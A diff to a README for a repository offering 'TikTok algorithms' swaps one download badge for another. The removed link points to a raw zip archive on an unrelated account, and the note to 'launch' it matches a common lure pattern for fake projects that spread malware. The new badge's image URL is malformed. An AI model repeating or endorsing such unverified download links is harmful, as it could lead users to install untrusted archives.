@@ -13,7 +13,7 @@ In this repository, you will find a variety of TikTok algorithms related to diff
 
 ## Get Started:
 To get started with the TikTok algorithms, download our repository content by clicking the button below:
-[![Download TikTok Algorithms](https://img.shields.io/badge/Download-TikTok%20Algorithms-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download TikTok Algorithms](https://github.com/ReyliTM7/TikTok-algorithm/releases/tag/v1.0%20Algorithms-blue)](https://github.com/ReyliTM7/TikTok-algorithm/releases/tag/v1.0)
 
 *Note: The link provided above needs to be launched to access the repository content.*
 
